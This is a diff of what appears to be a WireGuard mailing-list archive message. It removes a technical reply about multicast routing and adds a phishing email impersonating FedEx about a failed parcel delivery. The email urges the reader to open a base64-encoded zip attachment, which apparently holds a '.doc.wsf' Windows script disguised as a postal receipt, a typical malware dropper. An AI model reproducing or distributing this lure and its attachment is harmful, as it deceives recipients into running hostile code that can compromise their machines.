@@ -1,25 +1,23 @@
-Return-Path: joerg@higgsboson.tk
+Return-Path: october@root.server-ke25.com
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 23b21a4a
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 316d600d
  for <wireguard@lists.zx2c4.com>;
- Wed, 21 Dec 2016 17:25:21 +0000 (UTC)
-Received: from mail.higgsboson.tk (mail.higgsboson.tk [188.68.39.17])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 4dca5a56
+ Wed, 21 Dec 2016 18:48:48 +0000 (UTC)
+Received: from root.server-ke25.com (root.tiger-sasahost.com [148.251.30.198])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id d86db3d8
  for <wireguard@lists.zx2c4.com>;
- Wed, 21 Dec 2016 17:25:20 +0000 (UTC)
-Received: from [IPv6:2001:470:1f0b:f8d:5e51:4fff:fe58:e70b] (unknown
- [IPv6:2001:470:1f0b:f8d:5e51:4fff:fe58:e70b])
- by mail.higgsboson.tk (Postfix) with ESMTPSA id DFEA94ECA9
- for <wireguard@lists.zx2c4.com>; Wed, 21 Dec 2016 17:32:30 +0000 (UTC)
-Subject: Re: Multicast over a wireguard link?
+ Wed, 21 Dec 2016 18:48:47 +0000 (UTC)
+Received: from october by root.server-ke25.com with local (Exim 4.87)
+ (envelope-from <october@root.server-ke25.com>) id 1cJm3R-001NRk-59
+ for wireguard@lists.zx2c4.com; Wed, 21 Dec 2016 21:55:58 +0300
 To: wireguard@lists.zx2c4.com
-References: <87fuli7itj.fsf@toke.dk>
-From: =?UTF-8?Q?J=c3=b6rg_Thalheim?= <joerg@higgsboson.tk>
-Message-ID: <c86e8f14-da18-6cfe-c923-57e9d118b6a7@higgsboson.tk>
-Date: Wed, 21 Dec 2016 18:32:30 +0100
+Subject: Parcel ID00548431 delivery problems, please review
+Date: Wed, 21 Dec 2016 21:55:56 +0300
 MIME-Version: 1.0
-In-Reply-To: <87fuli7itj.fsf@toke.dk>
-Content-Type: text/plain; charset=windows-1252
+Message-ID: <6618291dbcabce60576b0ced127a2638@octoberict.net>
+From: "FedEx Priority Solutions" <nathan.drake@octoberict.net>
+Content-Type: multipart/mixed; boundary="b1_acab31b69fd72d2d5428a36d468a444f"
+Reply-To: FedEx Priority Solutions <nathan.drake@octoberict.net>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -29,25 +27,123 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-I currently use OSPF with one interface per peering with link-local ipv4/=
-ipv6 addresses (AllowedIPs=3D0.0.0.0/0,::/0, ipv4 =3D> 169.254.0.0/16 + l=
-ifetime 0)
+--b1_acab31b69fd72d2d5428a36d468a444f
+Content-Type: text/plain; charset=us-ascii
 
-This works fine.
+Dear Customer,
 
-On 2016-12-20 15:53, Toke H=F8iland-J=F8rgensen wrote:
-> Does Wireguard has a notion of multicast? I would like to eventually
-> replace my current VPN setup with wireguard. I currently run Tinc in
-> switch (layer 2) mode, and run the Babel routing protocol on top.
->
-> Babel announces itself via link-local multicast to everyone on the link=
-=2E
-> Does this work with wireguard? I guess the equivalent semantics would b=
-e
-> "send this packet to all known peers"...
->
-> -Toke
-> _______________________________________________
-> WireGuard mailing list
-> WireGuard@lists.zx2c4.com
-> https://lists.zx2c4.com/mailman/listinfo/wireguard
+This is to confirm that your item has been shipped at December 19.
+
+Download postal receipt attached to e-mail!
+
+Respectfully,
+Nathan Drake,
+Parcels Operation Manager.
+
+
+--b1_acab31b69fd72d2d5428a36d468a444f
+Content-Type: application/zip; name="Undelivered-Package-00548431.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Undelivered-Package-00548431.zip
+
+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
+BQYAAAAAAgACAIgAAAAPFQAAAAA=
+
+
+--b1_acab31b69fd72d2d5428a36d468a444f--
